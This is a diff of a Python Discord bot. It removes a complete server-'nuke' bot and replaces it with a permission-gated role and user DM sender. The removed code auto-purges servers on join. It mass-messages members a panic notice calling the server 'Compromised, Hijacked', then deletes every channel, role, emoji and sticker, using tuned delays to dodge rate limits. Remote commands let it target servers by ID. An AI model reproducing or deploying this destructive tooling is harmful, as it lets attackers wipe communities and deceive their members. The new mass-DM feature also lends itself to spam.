@@ -2,263 +2,820 @@ import discord
 from discord.ext import commands
 import os
 import asyncio
-from dotenv import load_dotenv
+from datetime import datetime
+import json
+import re
 
-# Load environment variables
-load_dotenv()
-
-# Bot setup with necessary intents
+# Bot setup
 intents = discord.Intents.default()
 intents.message_content = True
+intents.members = True
 intents.guilds = True
-intent.members = True
 
-bot = commands.Bot(command_prefix='!', intents=intents)
+bot = commands.Bot(command_prefix='-', intents=intents)
 
-# Auto-mode toggle
-auto_mode = False
+# Storage for user sessions
+user_sessions = {}
+
+class DMSession:
+    def __init__(self, user_id, guild_id):
+        self.user_id = user_id
+        self.guild_id = guild_id
+        self.target_type = None  # 'single_role', 'multiple_roles', 'single_user', 'multiple_users'
+        self.targets = []
+        self.message_type = None  # 'embed' or 'text'
+        self.message_content = {}
+        self.step = 'target_selection'
+
+class TargetSelectionView(discord.ui.View):
+    def __init__(self, user_id):
+        super().__init__(timeout=300)
+        self.user_id = user_id
+
+    @discord.ui.button(label='📝 Single Role', style=discord.ButtonStyle.primary, emoji='👥')
+    async def single_role(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if interaction.user.id != self.user_id:
+            await interaction.response.send_message("❌ This interaction is not for you!", ephemeral=True)
+            return
+        
+        session = user_sessions.get(self.user_id)
+        if session:
+            session.target_type = 'single_role'
+            session.step = 'role_input'
+            
+            embed = discord.Embed(
+                title="🎯 Role Selection",
+                description="Please provide the role you want to target:\n\n" +
+                           "**Options:**\n" +
+                           "• Role ID: `123456789`\n" +
+                           "• Role mention: `@RoleName`\n" +
+                           "• Role name: `RoleName`\n\n" +
+                           "⏰ You have 5 minutes to respond.",
+                color=0x3498db
+            )
+            
+            await interaction.response.edit_message(embed=embed, view=None)
+
+    @discord.ui.button(label='📝 Multiple Roles', style=discord.ButtonStyle.primary, emoji='👥')
+    async def multiple_roles(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if interaction.user.id != self.user_id:
+            await interaction.response.send_message("❌ This interaction is not for you!", ephemeral=True)
+            return
+        
+        session = user_sessions.get(self.user_id)
+        if session:
+            session.target_type = 'multiple_roles'
+            session.step = 'role_input'
+            
+            embed = discord.Embed(
+                title="🎯 Multiple Roles Selection",
+                description="Please provide the roles you want to target:\n\n" +
+                           "**Options:**\n" +
+                           "• Role IDs: `123456789 987654321`\n" +
+                           "• Role mentions: `@Role1 @Role2`\n" +
+                           "• Role names: `Role1 Role2`\n" +
+                           "• Mixed: `@Role1 123456789 RoleName`\n\n" +
+                           "⏰ You have 5 minutes to respond.",
+                color=0x3498db
+            )
+            
+            await interaction.response.edit_message(embed=embed, view=None)
+
+    @discord.ui.button(label='👤 Single User', style=discord.ButtonStyle.secondary, emoji='👤')
+    async def single_user(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if interaction.user.id != self.user_id:
+            await interaction.response.send_message("❌ This interaction is not for you!", ephemeral=True)
+            return
+        
+        session = user_sessions.get(self.user_id)
+        if session:
+            session.target_type = 'single_user'
+            session.step = 'user_input'
+            
+            embed = discord.Embed(
+                title="🎯 User Selection",
+                description="Please provide the user you want to target:\n\n" +
+                           "**Options:**\n" +
+                           "• User ID: `123456789`\n" +
+                           "• User mention: `@Username`\n\n" +
+                           "⏰ You have 5 minutes to respond.",
+                color=0x9b59b6
+            )
+            
+            await interaction.response.edit_message(embed=embed, view=None)
+
+    @discord.ui.button(label='👥 Multiple Users', style=discord.ButtonStyle.secondary, emoji='👥')
+    async def multiple_users(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if interaction.user.id != self.user_id:
+            await interaction.response.send_message("❌ This interaction is not for you!", ephemeral=True)
+            return
+        
+        session = user_sessions.get(self.user_id)
+        if session:
+            session.target_type = 'multiple_users'
+            session.step = 'user_input'
+            
+            embed = discord.Embed(
+                title="🎯 Multiple Users Selection",
+                description="Please provide the users you want to target:\n\n" +
+                           "**Options:**\n" +
+                           "• User IDs: `123456789 987654321`\n" +
+                           "• User mentions: `@User1 @User2`\n" +
+                           "• Mixed: `@User1 123456789`\n\n" +
+                           "⏰ You have 5 minutes to respond.",
+                color=0x9b59b6
+            )
+            
+            await interaction.response.edit_message(embed=embed, view=None)
+
+    @discord.ui.button(label='❌ Cancel', style=discord.ButtonStyle.danger, emoji='❌')
+    async def cancel(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if interaction.user.id != self.user_id:
+            await interaction.response.send_message("❌ This interaction is not for you!", ephemeral=True)
+            return
+        
+        if self.user_id in user_sessions:
+            del user_sessions[self.user_id]
+        
+        embed = discord.Embed(
+            title="❌ Operation Cancelled",
+            description="The DM operation has been cancelled.",
+            color=0xe74c3c
+        )
+        
+        await interaction.response.edit_message(embed=embed, view=None)
+
+class MessageTypeView(discord.ui.View):
+    def __init__(self, user_id):
+        super().__init__(timeout=300)
+        self.user_id = user_id
+
+    @discord.ui.button(label='📋 Rich Embed', style=discord.ButtonStyle.primary, emoji='✨')
+    async def embed_message(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if interaction.user.id != self.user_id:
+            await interaction.response.send_message("❌ This interaction is not for you!", ephemeral=True)
+            return
+        
+        session = user_sessions.get(self.user_id)
+        if session:
+            session.message_type = 'embed'
+            session.step = 'embed_title'
+            
+            embed = discord.Embed(
+                title="✨ Embed Message Setup",
+                description="Let's create a rich embed message!\n\n" +
+                           "**Step 1: Embed Title**\n" +
+                           "Please provide the title for your embed:\n\n" +
+                           "⏰ You have 5 minutes to respond.",
+                color=0xf39c12
+            )
+            
+            await interaction.response.edit_message(embed=embed, view=None)
+
+    @discord.ui.button(label='💬 Plain Text', style=discord.ButtonStyle.secondary, emoji='📝')
+    async def text_message(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if interaction.user.id != self.user_id:
+            await interaction.response.send_message("❌ This interaction is not for you!", ephemeral=True)
+            return
+        
+        session = user_sessions.get(self.user_id)
+        if session:
+            session.message_type = 'text'
+            session.step = 'text_content'
+            
+            embed = discord.Embed(
+                title="💬 Plain Text Message",
+                description="Please provide the message content you want to send:\n\n" +
+                           "**Tips:**\n" +
+                           "• Use `\\n` for line breaks\n" +
+                           "• Maximum 2000 characters\n\n" +
+                           "⏰ You have 5 minutes to respond.",
+                color=0x95a5a6
+            )
+            
+            await interaction.response.edit_message(embed=embed, view=None)
+
+    @discord.ui.button(label='❌ Cancel', style=discord.ButtonStyle.danger, emoji='❌')
+    async def cancel(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if interaction.user.id != self.user_id:
+            await interaction.response.send_message("❌ This interaction is not for you!", ephemeral=True)
+            return
+        
+        if self.user_id in user_sessions:
+            del user_sessions[self.user_id]
+        
+        embed = discord.Embed(
+            title="❌ Operation Cancelled",
+            description="The DM operation has been cancelled.",
+            color=0xe74c3c
+        )
+        
+        await interaction.response.edit_message(embed=embed, view=None)
+
+class ConfirmationView(discord.ui.View):
+    def __init__(self, user_id):
+        super().__init__(timeout=300)
+        self.user_id = user_id
+
+    @discord.ui.button(label='✅ Send Messages', style=discord.ButtonStyle.success, emoji='🚀')
+    async def confirm_send(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if interaction.user.id != self.user_id:
+            await interaction.response.send_message("❌ This interaction is not for you!", ephemeral=True)
+            return
+        
+        session = user_sessions.get(self.user_id)
+        if not session:
+            await interaction.response.send_message("❌ Session not found!", ephemeral=True)
+            return
+        
+        await interaction.response.defer()
+        
+        # Get target users
+        target_users = []
+        guild = bot.get_guild(session.guild_id)
+        
+        if session.target_type in ['single_role', 'multiple_roles']:
+            for target in session.targets:
+                if isinstance(target, discord.Role):
+                    target_users.extend(target.members)
+        else:  # single_user or multiple_users
+            target_users = [target for target in session.targets if isinstance(target, discord.Member)]
+        
+        # Remove duplicates
+        target_users = list(set(target_users))
+        
+        if not target_users:
+            embed = discord.Embed(
+                title="❌ No Users Found",
+                description="No users were found to send messages to.",
+                color=0xe74c3c
+            )
+            await interaction.edit_original_response(embed=embed, view=None)
+            return
+        
+        # Send messages
+        success_count = 0
+        failed_count = 0
+        failed_users = []
+        
+        progress_embed = discord.Embed(
+            title="🚀 Sending Messages...",
+            description=f"Sending messages to {len(target_users)} users...",
+            color=0xf39c12
+        )
+        await interaction.edit_original_response(embed=progress_embed, view=None)
+        
+        for user in target_users:
+            try:
+                if session.message_type == 'embed':
+                    dm_embed = discord.Embed(
+                        title=session.message_content.get('title', 'No Title'),
+                        description=session.message_content.get('description', 'No Description'),
+                        color=int(session.message_content.get('color', '3498db'), 16)
+                    )
+                    if session.message_content.get('footer'):
+                        dm_embed.set_footer(text=session.message_content['footer'])
+                    if session.message_content.get('thumbnail'):
+                        dm_embed.set_thumbnail(url=session.message_content['thumbnail'])
+                    
+                    await user.send(embed=dm_embed)
+                else:
+                    await user.send(session.message_content['content'])
+                
+                success_count += 1
+                await asyncio.sleep(1)  # Rate limit protection
+                
+            except Exception as e:
+                failed_count += 1
+                failed_users.append(f"{user.display_name} ({user.id})")
+        
+        # Final report
+        result_embed = discord.Embed(
+            title="📊 Message Sending Complete",
+            color=0x2ecc71 if failed_count == 0 else 0xf39c12
+        )
+        
+        result_embed.add_field(
+            name="✅ Successful",
+            value=f"{success_count} messages sent",
+            inline=True
+        )
+        
+        result_embed.add_field(
+            name="❌ Failed",
+            value=f"{failed_count} messages failed",
+            inline=True
+        )
+        
+        if failed_users:
+            failed_list = "\n".join(failed_users[:10])  # Show first 10 failed users
+            if len(failed_users) > 10:
+                failed_list += f"\n... and {len(failed_users) - 10} more"
+            
+            result_embed.add_field(
+                name="Failed Users",
+                value=f"```{failed_list}```",
+                inline=False
+            )
+        
+        await interaction.edit_original_response(embed=result_embed, view=None)
+        
+        # Clean up session
+        if self.user_id in user_sessions:
+            del user_sessions[self.user_id]
+
+    @discord.ui.button(label='✏️ Edit Message', style=discord.ButtonStyle.secondary, emoji='✏️')
+    async def edit_message(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if interaction.user.id != self.user_id:
+            await interaction.response.send_message("❌ This interaction is not for you!", ephemeral=True)
+            return
+        
+        session = user_sessions.get(self.user_id)
+        if session:
+            # Reset to message type selection
+            session.step = 'message_type'
+            session.message_content = {}
+            
+            embed = discord.Embed(
+                title="💬 Message Configuration",
+                description="Choose how you want to format your message:",
+                color=0x3498db
+            )
+            
+            view = MessageTypeView(self.user_id)
+            await interaction.response.edit_message(embed=embed, view=view)
+
+    @discord.ui.button(label='❌ Cancel', style=discord.ButtonStyle.danger, emoji='❌')
+    async def cancel(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if interaction.user.id != self.user_id:
+            await interaction.response.send_message("❌ This interaction is not for you!", ephemeral=True)
+            return
+        
+        if self.user_id in user_sessions:
+            del user_sessions[self.user_id]
+        
+        embed = discord.Embed(
+            title="❌ Operation Cancelled",
+            description="The DM operation has been cancelled.",
+            color=0xe74c3c
+        )
+        
+        await interaction.response.edit_message(embed=embed, view=None)
+
+def parse_targets(content, guild, target_type):
+    """Parse roles or users from message content"""
+    targets = []
+    parts = content.split()
+    
+    for part in parts:
+        part = part.strip()
+        
+        if target_type in ['single_role', 'multiple_roles']:
+            # Try to parse as role
+            role = None
+            
+            # Check if it's a role mention
+            if part.startswith('<@&') and part.endswith('>'):
+                role_id = part[3:-1]
+                try:
+                    role = guild.get_role(int(role_id))
+                except ValueError:
+                    continue
+            
+            # Check if it's a role ID
+            elif part.isdigit():
+                try:
+                    role = guild.get_role(int(part))
+                except ValueError:
+                    continue
+            
+            # Check if it's a role name
+            else:
+                role = discord.utils.get(guild.roles, name=part)
+            
+            if role:
+                targets.append(role)
+        
+        else:  # single_user or multiple_users
+            # Try to parse as user
+            user = None
+            
+            # Check if it's a user mention
+            if part.startswith('<@') and part.endswith('>'):
+                user_id = part[2:-1]
+                if user_id.startswith('!'):
+                    user_id = user_id[1:]
+                try:
+                    user = guild.get_member(int(user_id))
+                except ValueError:
+                    continue
+            
+            # Check if it's a user ID
+            elif part.isdigit():
+                try:
+                    user = guild.get_member(int(part))
+                except ValueError:
+                    continue
+            
+            if user:
+                targets.append(user)
+    
+    return targets
+
+def is_valid_hex_color(color):
+    """Check if a string is a valid hex color"""
+    if not color:
+        return False
+    if color.startswith('#'):
+        color = color[1:]
+    return len(color) == 6 and all(c in '0123456789abcdefABCDEF' for c in color)
+
+def is_valid_url(url):
+    """Simple URL validation"""
+    return url.startswith(('http://', 'https://'))
 
 @bot.event
 async def on_ready():
-    print(f'{bot.user} has connected to Discord!')
+    print(f'✅ {bot.user} is ready!')
+    print(f'🌐 Connected to {len(bot.guilds)} guilds')
+
+@bot.command(name='send')
+async def send_command(ctx):
+    """Main command to start the DM sending process"""
+    if not ctx.guild:
+        await ctx.send("❌ This command can only be used in a server!")
+        return
+    
+    # Check if user has permission (you can customize this)
+    if not ctx.author.guild_permissions.manage_messages:
+        await ctx.send("❌ You need 'Manage Messages' permission to use this command!")
+        return
+    
+    # Create new session
+    user_sessions[ctx.author.id] = DMSession(ctx.author.id, ctx.guild.id)
+    
+    embed = discord.Embed(
+        title="🚀 DM Sender Bot",
+        description="Welcome to the DM Sender! Choose your target type:",
+        color=0x3498db
+    )
+    
+    embed.add_field(
+        name="📝 Role Options",
+        value="• **Single Role** - Target one role\n• **Multiple Roles** - Target multiple roles",
+        inline=True
+    )
+    
+    embed.add_field(
+        name="👤 User Options",
+        value="• **Single User** - Target one user\n• **Multiple Users** - Target multiple users",
+        inline=True
+    )
+    
+    embed.set_footer(text="⏰ This menu will expire in 5 minutes")
+    
+    view = TargetSelectionView(ctx.author.id)
+    await ctx.send(embed=embed, view=view)
 
 @bot.event
-async def on_guild_join(guild):
-    """Auto-purge when joining a server if auto mode is enabled"""
-    if auto_mode:
-        # Find the bot owner or first user with admin perms
-        owner = bot.get_user(bot.owner_id) if bot.owner_id else None
-        if not owner:
-            # Find first admin in the server
-            for member in guild.members:
-                if member.guild_permissions.administrator and not member.bot:
-                    owner = member
-                    break
-        
-        await purge_server(guild, owner)
-
-async def purge_server(guild, notify_user=None):
-    """Purge all channels, roles, emojis, and stickers from a server"""
-    
-    # Count items
-    channel_count = len(guild.channels)
-    role_count = len([r for r in guild.roles if r.name != "@everyone" and not r.managed])
-    emoji_count = len(guild.emojis)
-    sticker_count = len(guild.stickers)
-    
-    # DM warning to all members except those under bot's role
-    try:
-        # Find first text channel to create invite
-        text_channel = None
-        for channel in guild.channels:
-            if isinstance(channel, discord.TextChannel):
-                text_channel = channel
-                break
-        
-        # Create invite link
-        invite_link = "No invite available"
-        if text_channel:
-            try:
-                invite = await text_channel.create_invite(max_age=0, max_uses=0)
-                invite_link = invite.url
-            except:
-                pass
-        
-        # Get bot's highest role position
-        bot_member = guild.me
-        bot_role_position = bot_member.top_role.position if bot_member else 0
-        
-        # DM all members except those with roles higher than bot
-        warning_msg = f"🚨 **LEAVE THIS SERVER** 🚨\n\n**Backup invite:** {invite_link}\n\n**THIS SERVER IS:** Compromised, Corrupted, Under Attack, Being Purged, Unsafe, Hijacked, Destroyed"
-        
-        dm_count = 0
-        for member in guild.members:
-            try:
-                # Skip bots and members with roles higher than bot
-                if member.bot:
-                    continue
-                
-                member_role_position = member.top_role.position if member.top_role else 0
-                if member_role_position >= bot_role_position:
-                    continue
-                
-                # Send DM
-                await member.send(warning_msg)
-                dm_count += 1
-                await asyncio.sleep(0.5)  # Rate limit for DMs
-                
-            except:
-                pass  # Skip if can't DM
-        
-        # Small delay before starting destruction
-        await asyncio.sleep(2)
-        
-    except:
-        pass
-    
-    async def safe_delete(item, delay=1.5):
-        """Safely delete an item with conservative rate limit handling"""
-        try:
-            await item.delete()
-            await asyncio.sleep(delay)
-            return True
-        except discord.Forbidden:
-            print(f"No permission to delete {item}")
-            return False
-        except discord.HTTPException as e:
-            if e.status == 429:  # Rate limited
-                retry_after = float(e.response.headers.get('Retry-After', 5))
-                print(f"Rate limited, waiting {retry_after} seconds")
-                await asyncio.sleep(retry_after + 2)
-                try:
-                    await item.delete()
-                    await asyncio.sleep(delay)
-                    return True
-                except:
-                    return False
-            else:
-                print(f"HTTP error deleting {item}: {e}")
-                return False
-        except Exception as e:
-            print(f"Error deleting {item}: {e}")
-            return False
-    
-    # Check bot permissions first
-    bot_member = guild.me
-    if not bot_member.guild_permissions.manage_channels:
-        if notify_user:
-            try:
-                await notify_user.send(f"Missing permissions in {guild.name} - need Manage Channels")
-            except:
-                pass
+async def on_message(message):
+    if message.author.bot:
         return
     
-    deleted_channels = 0
-    deleted_roles = 0
-    deleted_emojis = 0
-    deleted_stickers = 0
-    
-    # Delete channels first (most permissive)
-    print(f"Deleting {len(guild.channels)} channels...")
-    channels = guild.channels.copy()
-    for channel in channels:
-        if await safe_delete(channel, 1.2):
-            deleted_channels += 1
-    
-    # Long break before roles (they have harsh limits)
-    await asyncio.sleep(5)
-    
-    # Delete roles very slowly (they have 24h ban potential)
-    print(f"Deleting roles...")
-    roles = guild.roles.copy()
-    for role in roles:
-        if role.name != "@everyone" and not role.managed:
-            # Check if bot can delete this role (role hierarchy)
-            if bot_member.top_role.position > role.position:
-                if await safe_delete(role, 2.0):  # 2 second delay for roles
-                    deleted_roles += 1
-            else:
-                print(f"Cannot delete role {role.name} - hierarchy issue")
-    
-    # Long break before emojis (they have special limits)
-    await asyncio.sleep(5)
-    
-    # Delete emojis slowly
-    print(f"Deleting emojis...")
-    emojis = guild.emojis.copy()
-    for emoji in emojis:
-        if await safe_delete(emoji, 1.5):
-            deleted_emojis += 1
-    
-    # Break before stickers
-    await asyncio.sleep(3)
-    
-    # Delete stickers
-    print(f"Deleting stickers...")
-    stickers = guild.stickers.copy()
-    for sticker in stickers:
-        if await safe_delete(sticker, 1.5):
-            deleted_stickers += 1
-    
-    # Send notification if user provided
-    if notify_user:
-        try:
-            await notify_user.send(f"Nuked {guild.name}: {deleted_channels}/{channel_count} channels, {deleted_roles}/{role_count} roles, {deleted_emojis}/{emoji_count} emojis, {deleted_stickers}/{sticker_count} stickers | DMed {dm_count} members")
-        except:
-            pass
-
-@bot.command(name='c')
-async def purge_by_id(ctx, server_id: int = None):
-    """Purge server by ID (DM only)"""
-    
-    # Check if command is used in DM
-    if ctx.guild is not None:
+    # Check if user has an active session
+    session = user_sessions.get(message.author.id)
+    if not session:
+        await bot.process_commands(message)
         return
     
-    if server_id is None:
-        await ctx.send("Need server ID.")
-        return
+    # Handle different steps
+    if session.step == 'role_input':
+        guild = bot.get_guild(session.guild_id)
+        targets = parse_targets(message.content, guild, session.target_type)
+        
+        if not targets:
+            embed = discord.Embed(
+                title="❌ No Valid Roles Found",
+                description="I couldn't find any valid roles from your input. Please try again with:\n\n" +
+                           "• Role ID: `123456789`\n" +
+                           "• Role mention: `@RoleName`\n" +
+                           "• Role name: `RoleName`",
+                color=0xe74c3c
+            )
+            await message.reply(embed=embed)
+            return
+        
+        session.targets = targets
+        session.step = 'message_type'
+        
+        # Count total members
+        total_members = sum(len(role.members) for role in targets)
+        unique_members = len(set(member for role in targets for member in role.members))
+        
+        embed = discord.Embed(
+            title="✅ Roles Selected",
+            description=f"**Selected Roles:** {', '.join(role.name for role in targets)}\n\n" +
+                       f"**Total Role Members:** {total_members}\n" +
+                       f"**Unique Members:** {unique_members}\n\n" +
+                       "Now choose your message type:",
+            color=0x2ecc71
+        )
+        
+        view = MessageTypeView(message.author.id)
+        await message.reply(embed=embed, view=view)
     
-    guild = bot.get_guild(server_id)
-    if guild is None:
-        await ctx.send("Server not found.")
-        return
+    elif session.step == 'user_input':
+        guild = bot.get_guild(session.guild_id)
+        targets = parse_targets(message.content, guild, session.target_type)
+        
+        if not targets:
+            embed = discord.Embed(
+                title="❌ No Valid Users Found",
+                description="I couldn't find any valid users from your input. Please try again with:\n\n" +
+                           "• User ID: `123456789`\n" +
+                           "• User mention: `@Username`",
+                color=0xe74c3c
+            )
+            await message.reply(embed=embed)
+            return
+        
+        session.targets = targets
+        session.step = 'message_type'
+        
+        embed = discord.Embed(
+            title="✅ Users Selected",
+            description=f"**Selected Users:** {', '.join(user.display_name for user in targets)}\n\n" +
+                       f"**Total Users:** {len(targets)}\n\n" +
+                       "Now choose your message type:",
+            color=0x2ecc71
+        )
+        
+        view = MessageTypeView(message.author.id)
+        await message.reply(embed=embed, view=view)
     
-    # Check if user has admin perms in that server
-    member = guild.get_member(ctx.author.id)
-    if member is None or not member.guild_permissions.administrator:
-        await ctx.send("No perms in that server.")
-        return
+    elif session.step == 'embed_title':
+        if len(message.content) > 256:
+            embed = discord.Embed(
+                title="❌ Title Too Long",
+                description="Embed titles must be 256 characters or less. Please try again.",
+                color=0xe74c3c
+            )
+            await message.reply(embed=embed)
+            return
+        
+        session.message_content['title'] = message.content
+        session.step = 'embed_description'
+        
+        embed = discord.Embed(
+            title="✨ Embed Description",
+            description="Please provide the description for your embed:\n\n" +
+                       "**Tips:**\n" +
+                       "• Use `\\n` for line breaks\n" +
+                       "• Maximum 4096 characters\n" +
+                       "• You can use markdown formatting\n\n" +
+                       "⏰ You have 5 minutes to respond.",
+            color=0xf39c12
+        )
+        
+        await message.reply(embed=embed)
     
-    await ctx.send("Starting purge...")
-    await purge_server(guild, ctx.author)
-    await ctx.send("Done.")
-
-@bot.command(name='autoturn')
-async def toggle_auto(ctx, mode: str = None):
-    """Toggle auto-purge mode (DM only)"""
-    global auto_mode
+    elif session.step == 'embed_description':
+        if len(message.content) > 4096:
+            embed = discord.Embed(
+                title="❌ Description Too Long",
+                description="Embed descriptions must be 4096 characters or less. Please try again.",
+                color=0xe74c3c
+            )
+            await message.reply(embed=embed)
+            return
+        
+        session.message_content['description'] = message.content.replace('\\n', '\n')
+        session.step = 'embed_color'
+        
+        embed = discord.Embed(
+            title="🎨 Embed Color",
+            description="Please provide the color for your embed:\n\n" +
+                       "**Options:**\n" +
+                       "• Hex color: `#3498db` or `3498db`\n" +
+                       "• Type `skip` to use default blue\n\n" +
+                       "⏰ You have 5 minutes to respond.",
+            color=0xf39c12
+        )
+        
+        await message.reply(embed=embed)
     
-    # Check if command is used in DM
-    if ctx.guild is not None:
-        return
+    elif session.step == 'embed_color':
+        if message.content.lower() == 'skip':
+            session.message_content['color'] = '3498db'
+        else:
+            color = message.content.strip()
+            if not is_valid_hex_color(color):
+                embed = discord.Embed(
+                    title="❌ Invalid Color",
+                    description="Please provide a valid hex color (e.g., `#3498db` or `3498db`) or type `skip`.",
+                    color=0xe74c3c
+                )
+                await message.reply(embed=embed)
+                return
+            
+            if color.startswith('#'):
+                color = color[1:]
+            session.message_content['color'] = color
+        
+        session.step = 'embed_footer'
+        
+        embed = discord.Embed(
+            title="📝 Embed Footer",
+            description="Please provide the footer text for your embed:\n\n" +
+                       "**Tips:**\n" +
+                       "• Maximum 2048 characters\n" +
+                       "• Type `skip` to have no footer\n\n" +
+                       "⏰ You have 5 minutes to respond.",
+            color=0xf39c12
+        )
+        
+        await message.reply(embed=embed)
     
-    if mode is None:
-        await ctx.send(f"Auto mode: {'on' if auto_mode else 'off'}")
-        return
+    elif session.step == 'embed_footer':
+        if message.content.lower() != 'skip':
+            if len(message.content) > 2048:
+                embed = discord.Embed(
+                    title="❌ Footer Too Long",
+                    description="Embed footers must be 2048 characters or less. Please try again or type `skip`.",
+                    color=0xe74c3c
+                )
+                await message.reply(embed=embed)
+                return
+            session.message_content['footer'] = message.content
+        
+        session.step = 'embed_thumbnail'
+        
+        embed = discord.Embed(
+            title="🖼️ Embed Thumbnail",
+            description="Please provide a thumbnail URL for your embed:\n\n" +
+                       "**Tips:**\n" +
+                       "• Must be a valid image URL (http/https)\n" +
+                       "• Type `skip` to have no thumbnail\n\n" +
+                       "⏰ You have 5 minutes to respond.",
+            color=0xf39c12
+        )
+        
+        await message.reply(embed=embed)
     
-    if mode.lower() == "on":
-        auto_mode = True
-        await ctx.send("Auto mode on.")
-    elif mode.lower() == "off":
-        auto_mode = False
-        await ctx.send("Auto mode off.")
+    elif session.step == 'embed_thumbnail':
+        if message.content.lower() != 'skip':
+            if not is_valid_url(message.content):
+                embed = discord.Embed(
+                    title="❌ Invalid URL",
+                    description="Please provide a valid image URL (starting with http:// or https://) or type `skip`.",
+                    color=0xe74c3c
+                )
+                await message.reply(embed=embed)
+                return
+            session.message_content['thumbnail'] = message.content
+        
+        session.step = 'confirmation'
+        await show_confirmation(message.author.id, message.channel)
+    
+    elif session.step == 'text_content':
+        if len(message.content) > 2000:
+            embed = discord.Embed(
+                title="❌ Message Too Long",
+                description="Messages must be 2000 characters or less. Please try again.",
+                color=0xe74c3c
+            )
+            await message.reply(embed=embed)
+            return
+        
+        session.message_content['content'] = message.content.replace('\\n', '\n')
+        session.step = 'confirmation'
+        await show_confirmation(message.author.id, message.channel)
+    
     else:
-        await ctx.send("Use 'on' or 'off'.")
+        await bot.process_commands(message)
 
-@bot.command(name='servers')
-async def list_servers(ctx):
-    """List all servers the bot is in (DM only)"""
-    
-    # Check if command is used in DM
-    if ctx.guild is not None:
+async def show_confirmation(user_id, channel):
+    """Show confirmation message with preview"""
+    session = user_sessions.get(user_id)
+    if not session:
         return
     
-    servers = []
-    for guild in bot.guilds:
-        member = guild.get_member(ctx.author.id)
-        has_perms = member is not None and member.guild_permissions.administrator
-        servers.append(f"{guild.name} ({guild.id}) {'✓' if has_perms else '✗'}")
+    embed = discord.Embed(
+        title="🔍 Message Preview & Confirmation",
+        description="Here's how your message will look:",
+        color=0x3498db
+    )
     
-    if servers:
-        await ctx.send("Servers:\n" + "\n".join(servers))
+    # Add target information
+    if session.target_type in ['single_role', 'multiple_roles']:
+        target_names = [role.name for role in session.targets]
+        total_members = sum(len(role.members) for role in session.targets)
+        unique_members = len(set(member for role in session.targets for member in role.members))
+        
+        embed.add_field(
+            name="🎯 Target Roles",
+            value=f"**Roles:** {', '.join(target_names)}\n**Recipients:** {unique_members} unique members",
+            inline=False
+        )
     else:
-        await ctx.send("No servers.")
+        target_names = [user.display_name for user in session.targets]
+        embed.add_field(
+            name="🎯 Target Users",
+            value=f"**Users:** {', '.join(target_names)}\n**Recipients:** {len(session.targets)}",
+            inline=False
+        )
+    
+    # Create preview
+    if session.message_type == 'embed':
+        preview_embed = discord.Embed(
+            title=session.message_content.get('title', 'No Title'),
+            description=session.message_content.get('description', 'No Description'),
+            color=int(session.message_content.get('color', '3498db'), 16)
+        )
+        if session.message_content.get('footer'):
+            preview_embed.set_footer(text=session.message_content['footer'])
+        if session.message_content.get('thumbnail'):
+            preview_embed.set_thumbnail(url=session.message_content['thumbnail'])
+        
+        embed.add_field(
+            name="📋 Message Type",
+            value="Rich Embed",
+            inline=True
+        )
+        
+        await channel.send(embed=embed)
+        await channel.send("**Preview:**", embed=preview_embed)
+    else:
+        embed.add_field(
+            name="📋 Message Type",
+            value="Plain Text",
+            inline=True
+        )
+        
+        embed.add_field(
+            name="📝 Message Content",
+            value=f"```{session.message_content['content']}```",
+            inline=False
+        )
+        
+        await channel.send(embed=embed)
+    
+    # Send confirmation buttons
+    confirmation_embed = discord.Embed(
+        title="⚠️ Confirmation Required",
+        description="Are you sure you want to send this message to all selected recipients?",
+        color=0xf39c12
+    )
+    
+    view = ConfirmationView(user_id)
+    await channel.send(embed=confirmation_embed, view=view)
+
+@bot.command(name='help')
+async def help_command(ctx):
+    """Show help information"""
+    embed = discord.Embed(
+        title="🚀 DM Sender Bot - Help",
+        description="A powerful bot for sending DM messages to users or role members.",
+        color=0x3498db
+    )
+    
+    embed.add_field(
+        name="📋 Commands",
+        value="`-send` - Start the DM sending process\n`-help` - Show this help message",
+        inline=False
+    )
+    
+    embed.add_field(
+        name="🎯 Target Types",
+        value="• **Single Role** - Send to all members of one role\n" +
+              "• **Multiple Roles** - Send to all members of multiple roles\n" +
+              "• **Single User** - Send to one specific user\n" +
+              "• **Multiple Users** - Send to multiple specific users",
+        inline=False
+    )
+    
+    embed.add_field(
+        name="💬 Message Types",
+        value="• **Rich Embed** - Formatted message with title, description, color, etc.\n" +
+              "• **Plain Text** - Simple text message",
+        inline=False
+    )
+    
+    embed.add_field(
+        name="🔒 Permissions",
+        value="You need the 'Manage Messages' permission to use this bot.",
+        inline=False
+    )
+    
+    embed.set_footer(text="Created with ❤️ for your server")
+    
+    await ctx.send(embed=embed)
 
 # Run the bot
 if __name__ == "__main__":
     TOKEN = os.getenv('DISCORD_TOKEN')
-    if TOKEN:
-        bot.run(TOKEN)
-    else:
-        print("No token found.")
+    if not TOKEN:
+        print("❌ Error: DISCORD_TOKEN environment variable not set!")
+        exit(1)
+    
+    bot.run(TOKEN)
